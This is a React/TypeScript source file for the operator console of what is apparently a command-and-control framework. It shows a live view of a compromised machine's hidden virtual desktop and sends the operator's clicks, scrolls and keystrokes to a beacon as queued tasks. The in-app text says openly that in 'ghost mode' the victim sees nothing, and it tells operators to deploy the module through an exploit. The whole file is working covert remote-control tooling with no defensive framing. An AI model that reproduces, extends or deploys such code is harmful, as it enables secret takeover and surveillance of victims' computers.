import { useCallback, useEffect, useRef, useState } from 'react'
import { Monitor, MousePointer2, Play, Square, Zap, Camera } from 'lucide-react'
import type { Beacon } from '@/store'

/**
 * RemoteCanvas — live view of the standalone Remote Session module.
 *
 * The module streams JPEG frames of the workspace it controls (in ghost
 * mode that is the HIDDEN virtual desktop — it has no monitor on the
 * target, so this stream is the only way to see it). Frames land as
 * artifacts under data/remote/ and arrive here through the artifacts API.
 *
 * The operator acts ON THE IMAGE: mouse moves/clicks/wheel and keyboard
 * events over the canvas are translated into in-band input tasks
 * (`remote input move|click|scroll|key|type`) — the same primitive the
 * module exposes for automation. This is what makes the module a VNC
 * instead of a picture strip.
 *
 * Coordinates are normalized to the frame's natural size, so the control
 * maps 1:1 to the remote resolution regardless of canvas scaling.
 */

interface Props {
  beacon: Beacon
  api: (method: string, endpoint: string, body?: unknown) => Promise<{ status: number; data: unknown }>
}

const MOVE_THROTTLE_MS = 120
const POLL_MS = 1200
const VISIBLE_FRAMES = 6

export default function RemoteCanvas({ beacon, api }: Props) {
  const [latest, setLatest] = useState<{ name: string; src: string } | null>(null)
  const [history, setHistory] = useState<string[]>([])
  const [streaming, setStreaming] = useState(false)
  const [liveMode, setLiveMode] = useState(false)
  const [typeText, setTypeText] = useState('')
  const [err, setErr] = useState('')
  const [seq, setSeq] = useState(0)
  const lastMove = useRef(0)
  const imgRef = useRef<HTMLImageElement>(null)
  const thumbs = useRef<Map<string, string>>(new Map())

  // ── stream controls ──────────────────────────────────────────────────────
  const queue = useCallback(async (command: string) => {
    await api('POST', `/api/c2/beacon/${beacon.id}/task`, { command })
  }, [api, beacon.id])

  const startStream = async (live: boolean) => {
    setErr('')
    const res = await queue(live ? 'remote live' : 'remote start')
    if (res !== undefined) {
      setStreaming(true)
      setLiveMode(live)
    }
  }

  const stopStream = async () => {
    await queue('remote stop')
    setStreaming(false)
    setLiveMode(false)
  }

  const grabFrame = async () => {
    await queue('remote frame')
  }

  // ── frame polling: newest artifact from data/remote/ ────────────────────
  useEffect(() => {
    let cancelled = false
    const load = async () => {
      try {
        const res = await api('GET', '/api/c2/artifacts')
        if (res.status !== 200 || cancelled) return
        const all = ((res.data as { artifacts?: Array<{ name: string; dir: string; kind: string }> }).artifacts) || []
        const frames = all.filter((a) => a.dir === 'remote' && a.kind === 'image')
          .slice(0, VISIBLE_FRAMES)
        if (frames.length === 0) return
        // fetch any frame we haven't cached yet
        const fresh: string[] = []
        for (const f of frames) {
          const key = f.name
          if (!thumbs.current.has(key)) {
            const r = await api('GET', `/api/c2/artifact?dir=remote&name=${encodeURIComponent(f.name)}`)
            if (r.status === 200) {
              const d = r.data as { media: string; data: string }
              thumbs.current.set(key, `data:${d.media};base64,${d.data}`)
            }
          }
          const src = thumbs.current.get(key)
          if (src) fresh.push(key)
        }
        if (cancelled || fresh.length === 0) return
        const newest = fresh[0]
        setLatest({ name: newest, src: thumbs.current.get(newest)! })
        setHistory(fresh)
        setSeq((s) => s + 1)
      } catch {
        // transient backend hiccup — next poll retries
      }
    }
    void load()
    const h = setInterval(load, POLL_MS)
    return () => { cancelled = true; clearInterval(h) }
  }, [api, beacon.id])

  // ── coordinate mapping ──────────────────────────────────────────────────
  const remoteCoords = (e: React.MouseEvent<HTMLImageElement>) => {
    const img = imgRef.current
    if (!img) return null
    const rect = img.getBoundingClientRect()
    const nx = (e.clientX - rect.left) / rect.width
    const ny = (e.clientY - rect.top) / rect.height
    if (nx < 0 || ny < 0 || nx > 1 || ny > 1) return null
    const x = Math.round(nx * (img.naturalWidth || rect.width))
    const y = Math.round(ny * (img.naturalHeight || rect.height))
    return { x, y }
  }

  const sendInput = (cmd: string) => {
    void queue(`remote input ${cmd}`)
  }

  const onMouseMove = (e: React.MouseEvent<HTMLImageElement>) => {
    const now = Date.now()
    if (now - lastMove.current < MOVE_THROTTLE_MS) return
    lastMove.current = now
    const c = remoteCoords(e)
    if (c) sendInput(`move ${c.x} ${c.y}`)
  }

  const onMouseDown = (e: React.MouseEvent<HTMLImageElement>) => {
    const c = remoteCoords(e)
    if (c) sendInput(`click ${c.x} ${c.y}`)
  }

  const onWheel = (e: React.WheelEvent<HTMLImageElement>) => {
    e.preventDefault()
    sendInput(`scroll ${e.deltaY < 0 ? 1 : -1}`)
  }

  const onTypeKey = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') { sendInput('key ENTER'); return }
    if (e.key === 'Escape') { sendInput('key ESC'); return }
    if (e.key === 'Tab') { sendInput('key TAB'); return }
    if (e.key.length === 1) {
      sendInput(`type ${typeText + e.key}`)
      e.preventDefault()
      setTypeText((t) => t + e.key)
    }
  }

  const onSendType = () => {
    if (typeText.trim()) {
      sendInput(`type ${typeText}`)
      setTypeText('')
    }
  }

  // ── render ────────────────────────────────────────────────────────────────
  return (
    <div className="flex flex-col h-full min-h-0">
      {/* controls */}
      <div className="flex items-center gap-2 px-3 py-2 border-b border-surface-border">
        <span className="text-[10px] font-semibold text-text-dim uppercase tracking-wider flex items-center gap-1.5">
          <Monitor size={12} className="text-phantom-magenta" /> Remote Session
        </span>
        <div className="ml-auto flex items-center gap-1.5">
          {!streaming ? (
            <>
              <button onClick={() => startStream(false)}
                className="px-2 py-1 rounded bg-phantom-green/15 text-phantom-green text-[10px] hover:bg-phantom-green/25 flex items-center gap-1">
                <Play size={10} /> start
              </button>
              <button onClick={() => startStream(true)} title="fast cadence (~250ms)"
                className="px-2 py-1 rounded bg-phantom-yellow/15 text-phantom-yellow text-[10px] hover:bg-phantom-yellow/25 flex items-center gap-1">
                <Zap size={10} /> live
              </button>
            </>
          ) : (
            <button onClick={stopStream}
              className="px-2 py-1 rounded bg-phantom-error/15 text-phantom-error text-[10px] hover:bg-phantom-error/25 flex items-center gap-1">
              <Square size={10} /> stop {liveMode ? '(live)' : ''}
            </button>
          )}
          <button onClick={grabFrame} title="single frame now"
            className="px-2 py-1 rounded bg-phantom-cyan/15 text-phantom-cyan text-[10px] hover:bg-phantom-cyan/25 flex items-center gap-1">
            <Camera size={10} /> frame
          </button>
        </div>
      </div>

      {/* canvas */}
      <div className="flex-1 min-h-0 flex items-center justify-center bg-black/60 relative overflow-hidden">
        {latest ? (
          <img ref={imgRef} src={latest.src} key={seq} alt={latest.name}
            onMouseMove={onMouseMove} onMouseDown={onMouseDown} onWheel={onWheel}
            className="max-w-full max-h-full object-contain cursor-crosshair select-none"
            draggable={false} />
        ) : (
          <div className="text-center text-text-dim text-xs space-y-2 p-6">
            <MousePointer2 size={28} className="mx-auto opacity-40" />
            <p>No remote frames yet.</p>
            <p className="text-[10px] max-w-sm">
              Deploy the module from a beacon (<code>remote</code>) or from any
              shell on the target (<code>use exploit → remote-deploy</code>),
              then press <b>start</b>. In ghost mode this canvas shows the
              hidden desktop — the victim sees nothing.
            </p>
          </div>
        )}
        {streaming && (
          <div className="absolute top-2 right-2 flex items-center gap-1 text-[9px] text-phantom-error bg-black/60 px-1.5 py-0.5 rounded">
            <span className="w-1.5 h-1.5 rounded-full bg-phantom-error animate-pulse" />
            {liveMode ? 'LIVE' : 'STREAMING'}
          </div>
        )}
      </div>

      {/* input bar */}
      {latest && (
        <div className="px-3 py-2 border-t border-surface-border flex items-center gap-2">
          <input
            value={typeText}
            onChange={(e) => setTypeText(e.target.value)}
            onKeyDown={onTypeKey}
            placeholder="type text → Enter to send · mouse on image = move/click · wheel = scroll"
            className="flex-1 bg-surface border border-surface-border rounded px-2 py-1 text-xs text-text-primary
              focus:outline-none focus:border-phantom-magenta/60"
          />
          <button onClick={onSendType}
            className="px-2 py-1 rounded bg-phantom-magenta/15 text-phantom-magenta text-[10px] hover:bg-phantom-magenta/25">
            send
          </button>
        </div>
      )}

      {/* frame history strip */}
      {history.length > 1 && (
        <div className="flex gap-1 px-3 py-1.5 border-t border-surface-border overflow-x-auto">
          {history.map((name) => (
            <button key={name} onClick={() => setLatest({ name, src: thumbs.current.get(name)! })}
              className={`flex-shrink-0 rounded border overflow-hidden ${latest?.name === name ? 'border-phantom-magenta' : 'border-surface-border hover:border-phantom-cyan/50'}`}>
              <img src={thumbs.current.get(name)} alt={name} className="h-10 w-16 object-cover" />
            </button>
          ))}
        </div>
      )}

      {err && <p className="px-3 py-1 text-[10px] text-phantom-error">{err}</p>}
    </div>
  )
}
